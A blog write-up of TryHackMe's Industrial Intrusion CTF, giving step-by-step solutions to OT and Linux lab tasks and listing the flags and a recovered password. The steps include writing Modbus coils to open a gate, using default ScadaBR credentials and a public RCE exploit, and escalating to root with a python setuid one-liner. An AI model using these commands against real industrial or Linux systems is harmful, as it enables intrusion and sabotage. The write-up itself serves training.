---
description: Appl3Tree's full detailed write-up of the TryHackMe Industrial Intrusion CTF.
title: TryHackMe – Industrial Intrusion CTF Full Write-up
date: 2025-06-29 21:00:00 -0700
categories:
  - CTF Writeups
tags:
  - TryHackMe
  - CTF
  - walkthrough
  - writeup
  - OT security
  - cybersecurity
show_image_post: true
image: /assets/img/infocards/thm-industrial-ctf.png

---

## Introduction

The [**Industrial Intrusion CTF**](https://tryhackme.com/industrial-intrusion?utm_source=discord&utm_medium=social&utm_campaign=industrialintrusionctf) on TryHackMe is a hands-on challenge designed to simulate real-world attacks against Operational Technology (OT) environments.

This event focuses on:

- Modbus manipulation
- OT protocol exploitation
- Network forensics
- OSINT investigations
- Embedded device reversing

Each task reinforces critical skills for **red teamers, blue teamers, and ICS security professionals** looking to expand their knowledge in industrial cybersecurity.

## Task 3 – Breach

Category: N/A  
Difficulty: Beginner  
Flag: THM{s4v3_th3_d4t3_27_jun3}

### Steps Taken

1. **Scanned all ports to identify services:**

```
nmap -p- -Pn -n --open -T5 <target_ip>
```

Found **502/tcp Modbus TCP** open.

2. **Analyzed challenge notes and Node-RED flows (provided):**

- **Coil 20**: motion detector
- **Coil 25**: badge authentication

3. **Tested setting coils 20 and 25 to true using mbtget:**

```
mbtget -w5 1 -u 1 -a 20 <target_ip>  # Enable motion detection
mbtget -w5 1 -u 1 -a 25 <target_ip>  # Enable badge authentication
```

4. **Confirmed coil states with:**

```
mbtget -r1 -u 1 -a 0 -n 40 <target_ip>
```

Showed coils 20 and 25 were set to 1.

5. **Gate remained closed, hypothesized an additional trigger coil.**

6. **Tested coil 30 as gate trigger:**

```
mbtget -w5 1 -u 1 -a 30 <target_ip>
```

7. **Gate opened, revealing flag.**

---

## Task 4 – Discord

Category: Discord  
Difficulty: Beginner  
Flag: THM{D15C0RD_57A5H_C0MM4ND5}

### Steps Taken

1. Joined the provided Discord server invite.

2. Ran:

```
/secret-function
```

Bot responded with the flag.

---

## Task 5 – OSINT 1

Category: OSINT  
Difficulty: Beginner  
Flag: THM{Su5sss}

### Steps Taken

1. **Queried crt.sh for certificates issued to** `virelia-water.it.com`.

2. **Found subdomain:**

```
54484d7b5375357373737d.virelia-water.it.com
```

3. **Decoded hex to ASCII:**

```
THM{Su5sss}
```

---

## Task 6 – OSINT 2

Category: OSINT  
Difficulty: Easy  
Flag: THM{uplink_channel_confirmed}

### Steps Taken

1. **Viewed phishing page source, found JS config reference:**

```
<script src="https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js">
```

2. **Fetched JS revealing:**

```js
var beacon = {
  session_id: "O-TX-11-403",
  fallback_dns: "uplink-fallback.virelia-water.it.com",
  token: "JBSWY3DPEBLW64TMMQQQ=="
};
```

3. **Searched VirusTotal for fallback subdomain:**

```
uplink-fallback.virelia-water.it.com
```

4. **Found DNS TXT record containing base64:**

```
eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=
```

5. **Decoded multiple times to JSON:**

```json
{
  "session": "T-CN1-172",
  "flag": "THM{uplink_channel_confirmed}"
}
```

---

## Task 7 – OSINT 3

Category: OSINT  
Difficulty: Medium  
Flag: THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}

### Steps Taken

1. Challenge referenced removed report:

```
https://virelia-water.it.com/mail-archives/ot-alerts/2025-06.html
```

2. **Manually searched GitHub for** `virelia-water`.

3. **Found repo:** `virelia-water/compliance`

4. **Located commit:**

*"Embed PGP-signed OT alert for June 2025"*

5. **Extracted PGP-signed message:**

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Please confirm system integrity at 03:00 UTC.
-----BEGIN PGP SIGNATURE-----

iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H
=jdL7
-----END PGP SIGNATURE-----
```

6. **Verified signature with:**

```
gpg --verify file.asc
```

7. **Issuer UID contained flag.**

---

## Task 10 – Web Brr v1

Category: Web  
Difficulty: Easy  
Flag: THM{rce_archieved_through_script_injection}

### Steps Taken

1. **Discovered open ports:**

- 22
- 80
- 5901
- 8080

2. **Navigated to port 8080:** Found ScadaBR login.

3. **Logged in with default credentials:**

```
admin:admin
```

4. **Ran searchsploit:**

```
searchsploit ScadaBR
```

Found exploit **49734.py** for Windows RCE.

5. **Executed exploit:**

```
python2 49734.py <target_ip> 8080 admin admin
```

6. **Obtained shell and retrieved flag.**

---

## Task 13 – Forensics Orcam

Category: Forensics  
Difficulty: Easy  
Flag: THM{Ev1l_M@Cr0}

### Steps Taken

1. Found `writing_template.eml` containing a base64 attachment.

2. **Decoded to** `malware.docm`.

3. **Analyzed macro with olevba:**

```
olevba malware.docm
```

4. Macro decoded shellcode array XOR’d with `"l33t"`, allocated memory, and executed with `CreateThread`.

5. **Decoded embedded password from net user command:**

```
echo 'VEhNe0V2MWxfTUBDcjB9' | base64 -d
```

Output:

```
THM{Ev1l_M@Cr0}
```

---

## Task 15 – Boot2Root Chess Industry

Category: Boot2Root  
Difficulty: Beginner  
Flags:  
User: THM{bishop_to_c4_check}  
Root: THM{check_check_check_mate}

### Steps Taken

1. **Scanned open ports:**

```
nmap -p- -Pn -n --open -T5 <target_ip>
```

Found:

- 22/tcp SSH
- 79/tcp finger
- 80/tcp http

2. **Visited web interface** (PrecisionChess IoT) – no login.

3. **Enumerated finger service:**

```
finger @<target_ip>
```

Found users:

- magnus
- fabiano
- hikaru

4. **Queried fabiano specifically:**

```
finger fabiano@<target_ip>
```

Found `.plan` with base64 string.

5. **Decoded:**

```
echo '<base64>' | base64 -d
```

Revealed:

```
fabiano:o3jVTktarGQI07q
```

6. **SSH as fabiano:**

```
ssh fabiano@<target_ip>
```

Retrieved user flag in home directory.

7. **Checked capabilities for privilege escalation:**

```
getcap -r / 2>/dev/null | grep python
```

Found:

```
/usr/bin/python3.10 = cap_setuid+ep
```

8. **Exploited with:**

```
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

9. **Retrieved root flag from /root directory.**

---

> _Note: AI-assisted editing was only used to format into markdown headings and frontmatter. All technical content and steps remain original._
